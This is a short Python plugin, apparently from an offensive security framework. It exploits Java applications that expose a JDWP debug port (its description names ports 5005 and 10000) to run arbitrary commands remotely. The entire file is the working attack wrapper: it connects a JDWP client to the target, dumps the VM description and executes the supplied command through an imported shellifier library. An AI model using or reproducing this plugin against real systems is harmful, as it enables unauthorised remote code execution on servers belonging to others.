from plugins.plugin import Plugin
from lib.jdwp.jdwp_shellifier import JDWPClient, runtime_exec


class RTPlugin(Plugin):
    def __init__(self):
        super().__init__()
        self.name = "JDWP"
        self.type = self.CMD
        self.desc = "目标Java应用开启了JDWP服务且对外开放，则攻击者可利用JDWP实现远程代码执行，常见端口5005，10000"

    def _run(self):
        cli = JDWPClient(self.host, self.port)

        cli.start()

        # print vm description
        self.log("Dump vm description " + cli.__str__())
        runtime_exec(cli, self.cmd)
        self.log("Command successfully executed")
        cli.leave()
